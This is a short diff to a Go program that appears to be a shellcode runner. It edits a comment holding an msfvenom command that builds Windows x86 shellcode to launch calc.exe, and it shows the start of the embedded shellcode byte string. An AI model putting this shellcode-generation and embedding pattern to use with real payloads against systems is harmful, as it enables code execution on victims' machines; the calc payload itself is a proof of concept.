@@ -30,7 +30,7 @@ func main() {
 		os.Exit(1)
 	}
 
-	//msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python  #
+	//msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python -v payload
 	//You have to remobe the b before " as you see bellow.
 
 	payload := "\xba\xad\x1e\x7c\x02\xdb\xcf\xd9\x74\x24\xf4\x5e\x33"
